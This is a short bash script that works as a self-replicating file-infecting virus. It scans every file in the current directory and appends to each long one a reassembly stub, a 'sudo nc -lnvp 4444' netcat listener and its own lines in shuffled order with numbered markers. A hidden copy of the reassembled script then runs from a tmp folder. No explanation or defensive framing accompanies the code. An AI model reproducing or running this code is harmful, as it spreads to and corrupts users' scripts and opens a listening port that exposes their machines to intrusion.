#!/usr/bin/env bash
MANAGER=(test cd ls pwd)  #@4
RANDOM=$$  #@5
for target in *; do  #@6
  nbline=$(wc -l $target)  #@7
  nbline=${nbline##}  #@8
  nbline=$(echo $nbline | cut -d " " -f1)  #@9
  if [ $(($nbline)) -lt 39 ]; then  #@10
    continue  #@11
  fi  #@12
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
  tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /home/tung/tmp/".$NEWFILE"  #@14
  chmod +x /home/tung/tmp/".$NEWFILE" && /home/tung/tmp/".$NEWFILE" test 2> /dev/null;  #@15 
  if [ "$?" == "0" ]; then  #@16
    continue  #@17
  fi  #@18
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
  NEWFILE="/home/tung/tmp/.$NEWFILE"  #@20
  echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@21
  echo "sudo nc -lnvp 4444 &" >> $target  #@22
  echo "exit 0" >> $target  #@23
  tabft=("FT" [36]=" ")  #@24
  declare -i nbl=0  #@25
  while [ $nbl -ne 36 ]; do  #@26
    valindex=$(((RANDOM % 36)+1))  #@27
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
      valindex=$(((RANDOM % 36) + 1))  #@29
    done  #@30
    line=$(tail -n $valindex $0 | head -1)  #@31
    echo -e "$line" >> $target  #@32
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@33
  done  #@34
done  #@35
rm /home/tung/tmp/.* 2> /dev/null  #@36
#nc -lnvp 4444 & #@36 